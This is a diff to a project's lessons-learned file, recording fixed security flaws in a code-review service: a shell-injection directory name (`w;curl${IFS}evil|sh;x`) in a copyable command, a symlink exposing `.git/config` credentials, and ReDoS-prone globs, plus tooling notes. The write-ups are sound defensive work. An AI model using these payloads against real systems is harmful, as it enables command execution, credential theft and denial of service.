@@ -25,6 +25,18 @@ the section guide and the promotion rule (a standing rule becomes one line under
 
 ## What Doesn't Work
 
+### 2026-10-05 — a command allowlist that checks script names but not directory names still emits a copyable shell injection
+**Symptom:** plan 26 review (SF1, SF3): the onboarding run-command allowlist matched `cd <dir>` against raw `readdir` names, so a committed directory named `w;curl${IFS}evil|sh;x` produced `cd w;curl${IFS}evil|sh;x && npm run dev` with a Copy button; after the fix, a directory named `-` still produced `cd - && …` (jumps to the previous directory).
+**Cause:** only script names went through `SAFE_SCRIPT_RE`; directory names from the clone were trusted. git checks out names containing `;`, `|`, `$`, spaces, and option-like names.
+**Rule:** every repo-derived token placed into a suggested command must match a strict allowlist regex at collection AND at grounding — for path segments `^[A-Za-z0-9_][A-Za-z0-9._-]*$` (no leading `-` or `.`). Also restrict `<pm> <script>` to scripts that cannot shadow a package-manager builtin (`start`/`test`); everything else uses `<pm> run`.
+**Evidence:** `server/src/modules/onboarding/constants.ts` `PACKAGE_DIR_RE`, `TWO_TOKEN_SCRIPTS` · `server/test/onboarding-grounding.test.ts` (`cd <bad>` cases) · commits d3fe61f, 8b24026
+
+### 2026-10-05 — a realpath "inside the clone" check still lets a committed symlink read `.git/config` (the forge PAT)
+**Symptom:** plan 24's security review (SF1, HIGH): a repo committing `docs/x.md -> ../.git/config` passed every guard of the context reader — the requested name matched the roots glob and `.md`, and `realpath(target)` was inside the clone — so `GET /repos/:id/context/doc?path=docs/x.md` (and a review run with that path attached) returned `.git/config`.
+**Cause:** the lexical allowlist (roots, extension) was checked on the *requested* name only; the realpath step checked only containment. The clone's `.git/config` holds the forge token in `remote.origin.url` (`repos/service.ts` `withForgeToken` → `simple-git.ts` `clone(url, …)`), so "inside the clone" is not "safe to read".
+**Rule:** for any reader of cloned-repo files, re-apply the full allowlist (roots glob, extension, no dot-directory segment) to the repo-relative form of the **realpath'd** target, after the containment check — not just to the requested path.
+**Evidence:** `server/src/modules/context/service.ts` `readSafely` (realRel check after `isInsideDir`) · `server/test/context.it.test.ts` "SF1: refuses an in-clone symlink to .git/config…"
+
 ### 2026-09-29 — a review diff by base *branch name* reviews unrelated commits, silently
 **Symptom:** a reviewer run on PR #8 of korzunss/dev-digest (74 files, +8 693) logged `Diff ready — 343 changed file(s)`, sent ~606k input tokens in one call, and returned 0 findings / score 100; the only candidate finding cited a file not in the PR and was dropped by grounding. Looks like a clean PR or a weak model.
 **Cause:** `loadDiff` ran `git diff ${pull.base}...${headSha}` where `pull.base` is the branch name (`octokit.ts` stores `pr.base.ref`). In the shallow clone the local `main` was stale (`c6af1e4`, while `origin/main` was current), so the merge-base was weeks old and the diff swept in every PR since. A non-empty diff never reaches the `pr_files` fallback.
@@ -86,6 +98,12 @@ collapses '..' before the guard can see it" ·
 `/etc/passwd`
 
 ## Codebase Patterns
+
+### 2026-10-06 — a type-only `import type … from 'db/schema'` in a module's `types.ts` is still a db-outside-repository edge
+**Symptom:** plan 28's G1 put `import type * as t from '../../db/schema.js'` in `brief/types.ts` just to write `typeof t.repos.$inferSelect`; typecheck, unit tests and the plan's own "repository is the only file using `db/schema`" Done-when all passed, and only the architecture-reviewer's import walk flagged it (F1, HIGH).
+**Cause:** the onion rule `db-confined-to-repositories` is defined with `tsPreCompilationDeps: true`, so type-only imports count as edges; "it's only a type" is not an exemption. There is no runnable depcruise config to catch it (root INSIGHTS 2026-09-26), so nothing automatic does.
+**Rule:** a row type derived from `db/schema` lives in the module's `repository.ts` (as `intent/repository.ts` exports `RepoRow`) or in `server/src/db/rows.ts` (next to `PullRow`); `types.ts`/`service.ts` import it type-only from there. Include `import type` lines when doing the manual `rg` edge walk for `db/schema`.
+**Evidence:** `.claude/skills/onion-architecture/enforcement.md:65,97` · fix: `server/src/modules/brief/repository.ts:6` (plan 28 fix-loop 1, F1) · pre-existing case: `server/src/modules/reviews/run-executor.ts:89`
 
 ### 2026-09-27 — correction: `findings.review_id` IS indexed now
 **Symptom:** the 2026-09-18 FK-index entry below still says
@@ -189,6 +207,29 @@ callback at all · `specs/001-run-cost-badge.md` → "Postgres indexes the colum
 foreign key POINTS AT"
 
 ## Tool & Library Notes
+
+### 2026-10-05 — `.it` tests all skip with "Expected Reaper to map exposed port 8080"
+**Symptom:** every `*.it.test.ts` (even the long-stable `context.it`) reported `N skipped` plus `FAIL … Error: Expected Reaper to map exposed port 8080` from `testcontainers/src/reaper/reaper.ts:63`; a `testcontainers-ryuk-*` container was Up with `8080/tcp` but no host port.
+**Cause:** the local Docker Desktop did not publish the reused Ryuk reaper's port; testcontainers aborts the suite setup, and the `.it` files skip instead of failing loudly. Not a code problem.
+**Rule:** if it appears, run `.it` tests with `TESTCONTAINERS_RYUK_DISABLED=true` (or restart Docker Desktop / `docker rm -f` the ryuk container) and treat a run whose `.it` files show "skipped" as not run.
+**Evidence:** plan 26 Verification log (T1) · `TESTCONTAINERS_RYUK_DISABLED=true pnpm exec vitest run test/onboarding.it.test.ts test/context.it.test.ts` → 62 passed
+
+### 2026-10-05 — an import-boundary test that strips comments with a regex and ignores `../../` passes real violations
+**Symptom:** plan 26 architecture review (F2–F5): the onboarding invariant test skipped every `../../` specifier, dropped the `type` modifier, only read the top-level folder, deleted code after a string containing `/*` (`'//***@'`), and banned only `db/schema` and LLM SDKs — so `../../modules/<other>/…`, a value import of `repo-intel/types`, `OpenRouterProvider` from reviewer-core, `db/client`, `simple-git` would all pass.
+**Rule:** write boundary tests on the TypeScript AST (`ts.createSourceFile`), walk recursively, resolve each specifier to a `src/`-relative path before matching, keep the type-only flag, use named-import allow-lists for barrels that also export adapters, and prove every rule with a planted violation.
+**Evidence:** `server/test/onboarding-architecture.test.ts` (`violationsOf`) · commits d3fe61f, 8b24026
+
+### 2026-10-05 — correction: the PSR1 glob caps were bypassed three more ways; the shape rules that hold, and how to prove them
+**Symptom:** plan 25's reviews found accepted root globs that still took seconds per path once the walk lost its depth limit (4 KB paths): `*a*/**/*a*/**/x.md` ~790 ms; `'**/*/**/'+'*/'×122+'*.md'` 1,068 ms on `'a/'×2046+'.x.md'`; `**/*/**/{**,x}.md` 2,775 ms on `'a/'×2046+'b.MD'`. Also `./!docs/**/*.md` slipped past a `startsWith('!')` negation check.
+**Cause:** cost is driven by (a) two or more segments holding ≥ 2 wildcards, (b) many segments after a second `**`, which is quadratic in the path's *segment count* — invisible when timing tests use a few long segments — and (c) a `**` inside braces or a segment (`{**,x}`, `a**b`), which picomatch 4 compiles to a slash-crossing globstar that whole-segment counting never sees. picomatch strips one leading `./` before detecting `!`.
+**Rule:** `validateRootGlob` must refuse: `scan(g).negated` (not just `startsWith('!')`); any `**` that is not a whole segment; more than one segment with ≥ 2 wildcards; and, with two `**`, anything but the file name after the second. Prove it with a fuzz, not hand-picked globs: random globs over brace/class/extglob/negation atoms, each accepted one matched against many-short-segment paths (`'a/'×2046+'b.MD'`, `'docs/'×818+'.x.md'`) as well as long-segment ones. After these rules: 600,222 accepted globs, worst 57.6 ms per 4 KB path.
+**Evidence:** `server/src/modules/context/helpers.ts` `globShapeProblem` · `server/test/context-helpers.test.ts` SEC1b/SEC2b/SEC2c blocks · plan 25 Verification log (review 1–3 triage)
+
+### 2026-10-05 — a user glob that `picomatch.makeRe` compiles fine can still hang the API for minutes when matched
+**Symptom:** plan 24's pr-self-review (PSR1, CRITICAL): the root glob `'**/' + '*a'.repeat(20) + '*b.md'` passed `validateRootGlob` (length, `.md`, no `..`, compiles), then matching it against `'a'.repeat(40) + '.md'` ran for more than 40 s (killed). After a per-segment wildcard cap, four `**` segments still took ~2 s on one 245-char path. The roots route is LAN-reachable with no auth, so one PUT plus one GET blocks the single-process API.
+**Cause:** picomatch compiles each `*` to a lazy `[^/]*?` and each `**` to a cross-segment group; the backtracking cost grows exponentially with wildcards per segment and polynomially (path length ^ `**` count) across segments. Compiling costs nothing — matching is where it blows up. The `security-reviewer` filtered ReDoS out by its NR rule; the pr-self-review catalog caught it as injection.
+**Rule:** validate a user-supplied glob's *shape*, not just its length: ≤ 2 `*`/`?` per segment, ≤ 2 `**` segments, no extglobs, nested braces, ranges or `/` inside braces — and keep a timing test that every accepted glob matches a 255-char name in < 50 ms.
+**Evidence:** `server/src/modules/context/helpers.ts` `globShapeProblem` · `server/src/modules/context/constants.ts` `MAX_SEGMENT_WILDCARDS`, `MAX_DOUBLE_STARS` · `server/test/context-helpers.test.ts` PSR1 block
 
 ### 2026-09-30 — a data migration goes into a `pnpm db:generate --custom` stub, generated *before* the schema edit
 **Symptom:** a new unique index needed existing duplicate rows cleaned first. drizzle-kit only emits DDL, and `migrations/**` is "generated only", so there seemed to be no legitimate place for the cleanup SQL. The custom migration's snapshot then showed hundreds of changed lines in a plain `diff`, which looked like schema drift.
